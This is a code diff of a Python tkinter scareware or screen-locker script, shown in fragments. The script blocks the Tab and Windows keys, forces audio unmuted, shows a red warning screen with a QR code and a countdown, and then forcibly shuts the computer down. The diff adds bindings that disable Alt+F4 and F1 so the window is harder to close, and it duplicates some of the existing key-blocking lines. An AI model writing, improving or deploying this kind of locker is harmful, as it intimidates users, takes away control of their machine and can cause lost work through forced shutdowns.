@@ -14,7 +14,10 @@ volume_control = devices.EndpointVolume
 keyboard.block_key('tab') 
 keyboard.block_key('left windows')
 keyboard.block_key('right windows')
-
+keyboard.block_key('tab') 
+keyboard.block_key('left windows')
+keyboard.block_key('right windows')
+keyboard.add_hotkey('alt+f4', lambda: None) 
 def enforce_unmute():
     if volume_control.GetMute() == 1:
         volume_control.SetMute(0, None)
@@ -59,6 +62,7 @@ def on_closing():
     keyboard.unblock_key('tab')
     keyboard.unblock_key('left windows')
     keyboard.unblock_key('right windows')
+    keyboard.remove_hotkey('alt+f4')
     root.destroy()
 def gifframes(path):
     frames = []
@@ -127,6 +131,10 @@ def warningui():
         print(f"Error loading qr.jpeg: {e}")
         error_label = tk.Label(right_frame, text="[ QR Code Missing ]", font=("Helvetica", 24), fg="red", bg="white")
         error_label.pack(expand=True)
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.bind("<Alt-F4>", lambda e: "break") 
+    root.bind("<F1>", lambda e: "break")
+    root.bind("<Escape>", lambda event: on_closing())
     root.mainloop()
 def countdown(time_left, label):
     if time_left >= 0:
@@ -138,10 +146,10 @@ def countdown(time_left, label):
         label.config(text="00:00\nSHUTTING DOWN...", fg="white")
         os.system("shutdown /s /t 0")
 
-root.protocol("WM_DELETE_WINDOW", on_closing)
+
 root.config(bg= "red",cursor="none")
 togglecol()
 alarm()
 enforce_unmute()
 warningui()
-root.bind("<F1>", lambda e: "break")
+
